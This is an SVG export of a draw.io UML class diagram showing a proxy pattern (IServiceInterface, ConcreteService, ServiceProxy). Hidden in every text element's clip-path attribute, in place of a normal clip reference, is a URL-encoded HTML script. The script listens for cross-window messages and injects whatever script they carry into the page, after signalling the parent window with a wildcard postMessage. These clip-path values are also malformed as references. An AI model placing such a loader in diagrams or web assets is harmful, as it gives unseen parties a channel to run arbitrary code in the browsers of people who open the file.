<svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="291.5px" width="441px" viewBox="-10 -10 461 311.5" content="&lt;mxGraphModel dx=&quot;1144&quot; dy=&quot;485&quot; grid=&quot;1&quot; gridSize=&quot;10&quot; guides=&quot;1&quot; tooltips=&quot;1&quot; connect=&quot;1&quot; arrows=&quot;1&quot; fold=&quot;1&quot; page=&quot;0&quot; pageScale=&quot;1&quot; pageWidth=&quot;850&quot; pageHeight=&quot;1100&quot; math=&quot;0&quot; shadow=&quot;0&quot;&gt;&lt;root&gt;&lt;mxCell id=&quot;0&quot;/&gt;&lt;mxCell id=&quot;1&quot; parent=&quot;0&quot;/&gt;&lt;mxCell id=&quot;2&quot; value=&quot;IServiceInterface&quot; style=&quot;swimlane;fontStyle=1;align=center;verticalAlign=top;childLayout=stackLayout;horizontal=1;startSize=26;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;&quot; vertex=&quot;1&quot; parent=&quot;1&quot;&gt;&lt;mxGeometry x=&quot;-80&quot; y=&quot;60&quot; width=&quot;160&quot; height=&quot;60&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;4&quot; value=&quot;&quot; style=&quot;line;strokeWidth=1;fillColor=none;align=left;verticalAlign=middle;spacingTop=-1;spacingLeft=3;spacingRight=3;rotatable=0;labelPosition=right;points=[];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;2&quot;&gt;&lt;mxGeometry y=&quot;26&quot; width=&quot;160&quot; height=&quot;8&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;5&quot; value=&quot;+ DoWork() : void&quot; style=&quot;text;strokeColor=none;fillColor=none;align=left;verticalAlign=top;spacingLeft=4;spacingRight=4;overflow=hidden;rotatable=0;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;2&quot;&gt;&lt;mxGeometry y=&quot;34&quot; width=&quot;160&quot; height=&quot;26&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;6&quot; value=&quot;ConcreteService&quot; style=&quot;swimlane;fontStyle=1;align=center;verticalAlign=top;childLayout=stackLayout;horizontal=1;startSize=26;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;&quot; vertex=&quot;1&quot; parent=&quot;1&quot;&gt;&lt;mxGeometry x=&quot;40&quot; y=&quot;249&quot; width=&quot;160&quot; height=&quot;60&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;7&quot; value=&quot;&quot; style=&quot;line;strokeWidth=1;fillColor=none;align=left;verticalAlign=middle;spacingTop=-1;spacingLeft=3;spacingRight=3;rotatable=0;labelPosition=right;points=[];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;6&quot;&gt;&lt;mxGeometry y=&quot;26&quot; width=&quot;160&quot; height=&quot;8&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;8&quot; value=&quot;+ DoWork() : void&quot; style=&quot;text;strokeColor=none;fillColor=none;align=left;verticalAlign=top;spacingLeft=4;spacingRight=4;overflow=hidden;rotatable=0;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;6&quot;&gt;&lt;mxGeometry y=&quot;34&quot; width=&quot;160&quot; height=&quot;26&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;9&quot; value=&quot;ServiceProxy&quot; style=&quot;swimlane;fontStyle=1;align=center;verticalAlign=top;childLayout=stackLayout;horizontal=1;startSize=26;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;&quot; vertex=&quot;1&quot; parent=&quot;1&quot;&gt;&lt;mxGeometry x=&quot;-240&quot; y=&quot;210&quot; width=&quot;200&quot; height=&quot;138&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;13&quot; value=&quot;- _service : ConcreteService&quot; style=&quot;text;strokeColor=none;fillColor=none;align=left;verticalAlign=top;spacingLeft=4;spacingRight=4;overflow=hidden;rotatable=0;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;9&quot;&gt;&lt;mxGeometry y=&quot;26&quot; width=&quot;200&quot; height=&quot;26&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;10&quot; value=&quot;&quot; style=&quot;line;strokeWidth=1;fillColor=none;align=left;verticalAlign=middle;spacingTop=-1;spacingLeft=3;spacingRight=3;rotatable=0;labelPosition=right;points=[];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;9&quot;&gt;&lt;mxGeometry y=&quot;52&quot; width=&quot;200&quot; height=&quot;8&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;12&quot; value=&quot;+ ServiceProxy(ConcreteService)&quot; style=&quot;text;strokeColor=none;fillColor=none;align=left;verticalAlign=top;spacingLeft=4;spacingRight=4;overflow=hidden;rotatable=0;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;9&quot;&gt;&lt;mxGeometry y=&quot;60&quot; width=&quot;200&quot; height=&quot;26&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;14&quot; value=&quot;+ CheckAccess() : bool&quot; style=&quot;text;strokeColor=none;fillColor=none;align=left;verticalAlign=top;spacingLeft=4;spacingRight=4;overflow=hidden;rotatable=0;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;9&quot;&gt;&lt;mxGeometry y=&quot;86&quot; width=&quot;200&quot; height=&quot;26&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;11&quot; value=&quot;+ DoWork() : void&quot; style=&quot;text;strokeColor=none;fillColor=none;align=left;verticalAlign=top;spacingLeft=4;spacingRight=4;overflow=hidden;rotatable=0;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;&quot; vertex=&quot;1&quot; parent=&quot;9&quot;&gt;&lt;mxGeometry y=&quot;112&quot; width=&quot;200&quot; height=&quot;26&quot; as=&quot;geometry&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;15&quot; value=&quot;&quot; style=&quot;endArrow=block;dashed=1;endFill=0;endSize=12;html=1;&quot; edge=&quot;1&quot; parent=&quot;1&quot; source=&quot;9&quot; target=&quot;2&quot;&gt;&lt;mxGeometry width=&quot;160&quot; relative=&quot;1&quot; as=&quot;geometry&quot;&gt;&lt;mxPoint x=&quot;120&quot; y=&quot;320&quot; as=&quot;sourcePoint&quot;/&gt;&lt;mxPoint x=&quot;10&quot; y=&quot;270&quot; as=&quot;targetPoint&quot;/&gt;&lt;Array as=&quot;points&quot;&gt;&lt;mxPoint x=&quot;-140&quot; y=&quot;160&quot;/&gt;&lt;mxPoint y=&quot;160&quot;/&gt;&lt;/Array&gt;&lt;/mxGeometry&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;16&quot; value=&quot;&quot; style=&quot;endArrow=block;dashed=1;endFill=0;endSize=12;html=1;&quot; edge=&quot;1&quot; parent=&quot;1&quot; source=&quot;6&quot; target=&quot;2&quot;&gt;&lt;mxGeometry width=&quot;160&quot; relative=&quot;1&quot; as=&quot;geometry&quot;&gt;&lt;mxPoint x=&quot;-78.88888888888891&quot; y=&quot;220&quot; as=&quot;sourcePoint&quot;/&gt;&lt;mxPoint x=&quot;-12.222222222222172&quot; y=&quot;130&quot; as=&quot;targetPoint&quot;/&gt;&lt;Array as=&quot;points&quot;&gt;&lt;mxPoint x=&quot;120&quot; y=&quot;160&quot;/&gt;&lt;mxPoint y=&quot;160&quot;/&gt;&lt;/Array&gt;&lt;/mxGeometry&gt;&lt;/mxCell&gt;&lt;mxCell id=&quot;17&quot; value=&quot;&quot; style=&quot;endArrow=open;html=1;endSize=12;startArrow=diamondThin;startSize=14;startFill=0;edgeStyle=orthogonalEdgeStyle;align=left;verticalAlign=bottom;&quot; edge=&quot;1&quot; parent=&quot;1&quot; source=&quot;9&quot; target=&quot;6&quot;&gt;&lt;mxGeometry x=&quot;-1&quot; y=&quot;3&quot; relative=&quot;1&quot; as=&quot;geometry&quot;&gt;&lt;mxPoint x=&quot;40&quot; y=&quot;210&quot; as=&quot;sourcePoint&quot;/&gt;&lt;mxPoint x=&quot;200&quot; y=&quot;210&quot; as=&quot;targetPoint&quot;/&gt;&lt;/mxGeometry&gt;&lt;/mxCell&gt;&lt;/root&gt;&lt;/mxGraphModel&gt;"><style type="text/css"></style><path d="M 158.51 28.05 L 161.33 1.94 L 318.57 -1.4 L 318.72 25.13" fill="#2a2a2a" stroke="none" pointer-events="none"/><path d="M 160.5 26.5 M 160.5 26.5 C 161.13 17.9 162.47 10.19 160.5 0.5 M 160.5 26.5 C 161.6 19.94 161.59 14.83 160.5 0.5 M 160.5 0.5 C 195.8 -1.97 231.17 -0.61 320.5 0.5 M 160.5 0.5 C 217.5 0.39 272.41 0.13 320.5 0.5 M 320.5 0.5 C 320.97 9.61 320.73 18.6 320.5 26.5 M 320.5 0.5 C 320.55 10.32 319.78 18.6 320.5 26.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 160.5 26.5 M 160.5 26.5 C 162.2 31.39 158.86 38.34 160.5 60.5 M 160.5 26.5 C 160.37 34.67 159.98 43.21 160.5 60.5 M 160.5 60.5 C 199.65 63.14 238.69 63.13 320.5 60.5 M 160.5 60.5 C 224.63 59.78 286.95 60.04 320.5 60.5 M 320.5 60.5 C 320.96 52.48 321.13 40.28 320.5 26.5 M 320.5 60.5 C 320.07 50.17 320.97 39.38 320.5 26.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 160.5 26.5 M 160.5 26.5 C 194 23.91 222.72 24.05 320.5 26.5 M 160.5 26.5 C 197.43 27.02 234.09 27.69 320.5 26.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><g fill="#f0f0f0" font-family="Helvetica" font-weight="bold" pointer-events="none" text-anchor="middle" font-size="12px"><text x="240.5" y="18.5">IServiceInterface</text></g><path d="M 160.5 30.5 M 160.5 30.5 C 191.71 29.19 226.08 29.73 320.5 30.5 M 160.5 30.5 C 220.86 32.72 279.71 31.83 320.5 30.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><clipPath id="mx-clip-165-40-152-26-0"><rect x="165" y="40" width="152" height="26"/></clipPath><g fill="#f0f0f0" font-family="Helvetica" pointer-events="none" clip-path="url(data:text/html,%0A%3Cscript%3E%0Aconst%20onWindowMessage%20%3D%20\(messageEvent\)%20%3D%3E%20%7B%0A%20%20const%20message%20%3D%20JSON.parse\(messageEvent.data\)%3B%0A%20%20if\(message.action%3D%3D%3D%22script%22\)%7B%0A%20%20%20%20const%20scriptElement%20%3D%20document.createElement\(%22script%22\)%3B%0A%20%20%20%20scriptElement.text%20%3D%20message.script%3B%0A%20%20%20%20document.head.appendChild\(scriptElement\)%3B%0A%20%20%7D%0A%20%20window.removeEventListener\(%22message%22%2C%20onWindowMessage\)%3B%0A%7D%0Awindow.addEventListener\(%22message%22%2ConWindowMessage\)%3B%0Awindow.parent.postMessage\(%22%7B%5C%22event%5C%22%3A%5C%22iframe%5C%22%7D%22%2C'*'\)%3B%0A%3C%2Fscript%3E#mx-clip-165-40-152-26-0)" font-size="12px"><text x="166.5" y="52.5">+ DoWork() : void</text></g><path d="M 278.51 214.41 L 278.95 190.37 L 442.43 190.32 L 439.37 215.89" fill="#2a2a2a" stroke="none" pointer-events="none"/><path d="M 280.5 215.5 M 280.5 215.5 C 278.73 207.67 281.82 199.19 280.5 189.5 M 280.5 215.5 C 280.01 207.17 281.34 197.34 280.5 189.5 M 280.5 189.5 C 325.15 189.78 373.97 191.05 440.5 189.5 M 280.5 189.5 C 329.05 190.08 380.26 190.72 440.5 189.5 M 440.5 189.5 C 442.3 194.63 441.16 202.64 440.5 215.5 M 440.5 189.5 C 440.67 197.89 441.51 204.58 440.5 215.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 280.5 215.5 M 280.5 215.5 C 281.18 224.24 281.14 228 280.5 249.5 M 280.5 215.5 C 281.33 225.51 281.25 237.92 280.5 249.5 M 280.5 249.5 C 340.64 249.22 405.61 251.87 440.5 249.5 M 280.5 249.5 C 327.72 247.6 375.81 249 440.5 249.5 M 440.5 249.5 C 438.66 236.43 438.74 228.67 440.5 215.5 M 440.5 249.5 C 441.31 240.96 440.31 230.97 440.5 215.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 280.5 215.5 M 280.5 215.5 C 313.43 218.67 345.44 215.61 440.5 215.5 M 280.5 215.5 C 332.29 214.21 383.33 215.76 440.5 215.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><g fill="#f0f0f0" font-family="Helvetica" font-weight="bold" pointer-events="none" text-anchor="middle" font-size="12px"><text x="360.5" y="207.5">ConcreteService</text></g><path d="M 280.5 219.5 M 280.5 219.5 C 312.29 219.71 343.12 216.85 440.5 219.5 M 280.5 219.5 C 343.01 217.46 405.14 218.23 440.5 219.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><clipPath id="mx-clip-285-229-152-26-0"><rect x="285" y="229" width="152" height="26"/></clipPath><g fill="#f0f0f0" font-family="Helvetica" pointer-events="none" clip-path="url(data:text/html,%0A%3Cscript%3E%0Aconst%20onWindowMessage%20%3D%20\(messageEvent\)%20%3D%3E%20%7B%0A%20%20const%20message%20%3D%20JSON.parse\(messageEvent.data\)%3B%0A%20%20if\(message.action%3D%3D%3D%22script%22\)%7B%0A%20%20%20%20const%20scriptElement%20%3D%20document.createElement\(%22script%22\)%3B%0A%20%20%20%20scriptElement.text%20%3D%20message.script%3B%0A%20%20%20%20document.head.appendChild\(scriptElement\)%3B%0A%20%20%7D%0A%20%20window.removeEventListener\(%22message%22%2C%20onWindowMessage\)%3B%0A%7D%0Awindow.addEventListener\(%22message%22%2ConWindowMessage\)%3B%0Awindow.parent.postMessage\(%22%7B%5C%22event%5C%22%3A%5C%22iframe%5C%22%7D%22%2C'*'\)%3B%0A%3C%2Fscript%3E#mx-clip-285-229-152-26-0)" font-size="12px"><text x="286.5" y="241.5">+ DoWork() : void</text></g><path d="M -1.49 176.43 L 2.17 151.94 L 199.32 152.36 L 200.86 177.21" fill="#2a2a2a" stroke="none" pointer-events="none"/><path d="M 0.5 176.5 M 0.5 176.5 C 0.06 168.25 2.46 156.2 0.5 150.5 M 0.5 176.5 C 1.19 168.43 0.51 158.67 0.5 150.5 M 0.5 150.5 C 69.65 152.21 135.41 150.6 200.5 150.5 M 0.5 150.5 C 56.76 149.44 112.31 149.27 200.5 150.5 M 200.5 150.5 C 199.29 156.95 199.48 163.53 200.5 176.5 M 200.5 150.5 C 200.76 157.62 200.31 166.43 200.5 176.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 0.5 176.5 M 0.5 176.5 C 1.9 197.77 2.32 221.75 0.5 288.5 M 0.5 176.5 C 1.74 213.86 2.39 252.63 0.5 288.5 M 0.5 288.5 C 59.94 290.18 118.05 288.96 200.5 288.5 M 0.5 288.5 C 44.62 288.39 90.43 287.25 200.5 288.5 M 200.5 288.5 C 201.12 266.13 199.12 242.16 200.5 176.5 M 200.5 288.5 C 201.7 265.41 201.77 243.1 200.5 176.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 0.5 176.5 M 0.5 176.5 C 41.87 173.94 82.33 175.32 200.5 176.5 M 0.5 176.5 C 67.83 176.16 135.5 177.24 200.5 176.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><g fill="#f0f0f0" font-family="Helvetica" font-weight="bold" pointer-events="none" text-anchor="middle" font-size="12px"><text x="100.5" y="168.5">ServiceProxy</text></g><clipPath id="mx-clip-5-182-192-26-0"><rect x="5" y="182" width="192" height="26"/></clipPath><g fill="#f0f0f0" font-family="Helvetica" pointer-events="none" clip-path="url(data:text/html,%0A%3Cscript%3E%0Aconst%20onWindowMessage%20%3D%20\(messageEvent\)%20%3D%3E%20%7B%0A%20%20const%20message%20%3D%20JSON.parse\(messageEvent.data\)%3B%0A%20%20if\(message.action%3D%3D%3D%22script%22\)%7B%0A%20%20%20%20const%20scriptElement%20%3D%20document.createElement\(%22script%22\)%3B%0A%20%20%20%20scriptElement.text%20%3D%20message.script%3B%0A%20%20%20%20document.head.appendChild\(scriptElement\)%3B%0A%20%20%7D%0A%20%20window.removeEventListener\(%22message%22%2C%20onWindowMessage\)%3B%0A%7D%0Awindow.addEventListener\(%22message%22%2ConWindowMessage\)%3B%0Awindow.parent.postMessage\(%22%7B%5C%22event%5C%22%3A%5C%22iframe%5C%22%7D%22%2C'*'\)%3B%0A%3C%2Fscript%3E#mx-clip-5-182-192-26-0)" font-size="12px"><text x="6.5" y="194.5">- _service : ConcreteService</text></g><path d="M 0.5 206.5 M 0.5 206.5 C 43.82 206.56 86.54 206.38 200.5 206.5 M 0.5 206.5 C 41.39 207.38 80.55 207.03 200.5 206.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><clipPath id="mx-clip-5-216-192-26-0"><rect x="5" y="216" width="192" height="26"/></clipPath><g fill="#f0f0f0" font-family="Helvetica" pointer-events="none" clip-path="url(data:text/html,%0A%3Cscript%3E%0Aconst%20onWindowMessage%20%3D%20\(messageEvent\)%20%3D%3E%20%7B%0A%20%20const%20message%20%3D%20JSON.parse\(messageEvent.data\)%3B%0A%20%20if\(message.action%3D%3D%3D%22script%22\)%7B%0A%20%20%20%20const%20scriptElement%20%3D%20document.createElement\(%22script%22\)%3B%0A%20%20%20%20scriptElement.text%20%3D%20message.script%3B%0A%20%20%20%20document.head.appendChild\(scriptElement\)%3B%0A%20%20%7D%0A%20%20window.removeEventListener\(%22message%22%2C%20onWindowMessage\)%3B%0A%7D%0Awindow.addEventListener\(%22message%22%2ConWindowMessage\)%3B%0Awindow.parent.postMessage\(%22%7B%5C%22event%5C%22%3A%5C%22iframe%5C%22%7D%22%2C'*'\)%3B%0A%3C%2Fscript%3E#mx-clip-5-216-192-26-0)" font-size="12px"><text x="6.5" y="228.5">+ ServiceProxy(ConcreteService)</text></g><clipPath id="mx-clip-5-242-192-26-0"><rect x="5" y="242" width="192" height="26"/></clipPath><g fill="#f0f0f0" font-family="Helvetica" pointer-events="none" clip-path="url(data:text/html,%0A%3Cscript%3E%0Aconst%20onWindowMessage%20%3D%20\(messageEvent\)%20%3D%3E%20%7B%0A%20%20const%20message%20%3D%20JSON.parse\(messageEvent.data\)%3B%0A%20%20if\(message.action%3D%3D%3D%22script%22\)%7B%0A%20%20%20%20const%20scriptElement%20%3D%20document.createElement\(%22script%22\)%3B%0A%20%20%20%20scriptElement.text%20%3D%20message.script%3B%0A%20%20%20%20document.head.appendChild\(scriptElement\)%3B%0A%20%20%7D%0A%20%20window.removeEventListener\(%22message%22%2C%20onWindowMessage\)%3B%0A%7D%0Awindow.addEventListener\(%22message%22%2ConWindowMessage\)%3B%0Awindow.parent.postMessage\(%22%7B%5C%22event%5C%22%3A%5C%22iframe%5C%22%7D%22%2C'*'\)%3B%0A%3C%2Fscript%3E#mx-clip-5-242-192-26-0)" font-size="12px"><text x="6.5" y="254.5">+ CheckAccess() : bool</text></g><clipPath id="mx-clip-5-268-192-26-0"><rect x="5" y="268" width="192" height="26"/></clipPath><g fill="#f0f0f0" font-family="Helvetica" pointer-events="none" clip-path="url(data:text/html,%0A%3Cscript%3E%0Aconst%20onWindowMessage%20%3D%20\(messageEvent\)%20%3D%3E%20%7B%0A%20%20const%20message%20%3D%20JSON.parse\(messageEvent.data\)%3B%0A%20%20if\(message.action%3D%3D%3D%22script%22\)%7B%0A%20%20%20%20const%20scriptElement%20%3D%20document.createElement\(%22script%22\)%3B%0A%20%20%20%20scriptElement.text%20%3D%20message.script%3B%0A%20%20%20%20document.head.appendChild\(scriptElement\)%3B%0A%20%20%7D%0A%20%20window.removeEventListener\(%22message%22%2C%20onWindowMessage\)%3B%0A%7D%0Awindow.addEventListener\(%22message%22%2ConWindowMessage\)%3B%0Awindow.parent.postMessage\(%22%7B%5C%22event%5C%22%3A%5C%22iframe%5C%22%7D%22%2C'*'\)%3B%0A%3C%2Fscript%3E#mx-clip-5-268-192-26-0)" font-size="12px"><text x="6.5" y="280.5">+ DoWork() : void</text></g><path d="M 100.5 150.5 M 100.5 150.5 C 100.04 143.56 98.65 131.9 100.5 110.5 M 100.5 150.5 C 101.09 135.93 99.95 121.21 100.5 110.5 M 100.5 110.5 C 102.36 104.29 102.1 98.7 110.5 100.5 M 100.5 110.5 C 102.41 104.11 103.63 102.53 110.5 100.5 M 110.5 100.5 C 150.97 101.44 190.03 101 230.5 100.5 M 110.5 100.5 C 142.58 101.01 172.11 100.78 230.5 100.5 M 230.5 100.5 C 237.2 99.38 238.64 95.81 240.5 90.5 M 230.5 100.5 C 236.41 98.62 241.92 97.7 240.5 90.5 M 240.5 90.5 C 239.59 85.25 239.06 80.28 240.5 74.62 M 240.5 90.5 C 241.38 86.85 240.23 81.77 240.5 74.62" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-dasharray="3 3" pointer-events="none"/><path d="M 240.5 61.62 M 240.5 61.62 C 241.44 65.52 241.81 65.93 247 74.62 M 240.5 61.62 C 243.59 66.13 245.1 70.59 247 74.62 M 247 74.62 C 240.72 75.59 236.94 74.39 234 74.62 M 247 74.62 C 241.81 74.83 237.13 74.53 234 74.62 M 234 74.62 C 234.82 71.96 237.33 65.6 240.5 61.62 M 234 74.62 C 234.77 71.26 236.66 68.26 240.5 61.62" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 360.5 189.5 M 360.5 189.5 C 358.85 173.28 360.29 157.58 360.5 110.5 M 360.5 189.5 C 359.89 171.2 360.33 153.76 360.5 110.5 M 360.5 110.5 C 359.06 102.82 358.31 102.33 350.5 100.5 M 360.5 110.5 C 360.31 102.37 357.93 101.96 350.5 100.5 M 350.5 100.5 C 315.42 100.45 278.96 98.99 250.5 100.5 M 350.5 100.5 C 325.14 101.47 301.42 100.96 250.5 100.5 M 250.5 100.5 C 242.46 99.78 241.12 96.09 240.5 90.5 M 250.5 100.5 C 243.69 100.98 240.56 96.21 240.5 90.5 M 240.5 90.5 C 241.82 86.42 241.27 81.21 240.5 74.62 M 240.5 90.5 C 240.32 86.41 240.73 80.57 240.5 74.62" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-dasharray="3 3" pointer-events="none"/><path d="M 240.5 61.62 M 240.5 61.62 C 240.64 64.69 243.05 68.15 247 74.62 M 240.5 61.62 C 242.19 64.71 244.02 68.4 247 74.62 M 247 74.62 C 245.22 74.59 240.24 75.13 234 74.62 M 247 74.62 C 241.63 74.75 237.85 74.3 234 74.62 M 234 74.62 C 237.04 70.37 237.84 68.5 240.5 61.62 M 234 74.62 C 236.03 70.82 237.48 67.93 240.5 61.62" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 216.49 219.5 M 216.49 219.5 C 230.71 219.11 244.03 220.3 278.26 219.5 M 216.49 219.5 C 234.57 219.7 253.38 219.83 278.26 219.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 201.49 219.5 M 201.49 219.5 C 203.58 218.35 205.28 217.93 208.99 215.09 M 201.49 219.5 C 203.5 218.27 205.79 216.98 208.99 215.09 M 208.99 215.09 C 211.63 215.38 213.5 218.06 216.49 219.5 M 208.99 215.09 C 211.67 216.52 214.36 218.49 216.49 219.5 M 216.49 219.5 C 215.15 220.64 213.66 221.6 208.99 223.91 M 216.49 219.5 C 214.04 220.66 212.03 221.85 208.99 223.91 M 208.99 223.91 C 207.09 222.66 205.67 221.32 201.49 219.5 M 208.99 223.91 C 206.9 222.43 204.65 221.37 201.49 219.5" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/><path d="M 266.38 226 M 266.38 226 C 269.97 224.26 272.9 223.75 279.38 219.5 M 266.38 226 C 269.88 224.2 273.84 222.32 279.38 219.5 M 279.38 219.5 C 276.97 216.34 273.37 217.17 266.38 213 M 279.38 219.5 C 275.11 217.07 270.96 215.66 266.38 213" fill="none" stroke="#f0f0f0" stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" pointer-events="none"/></svg>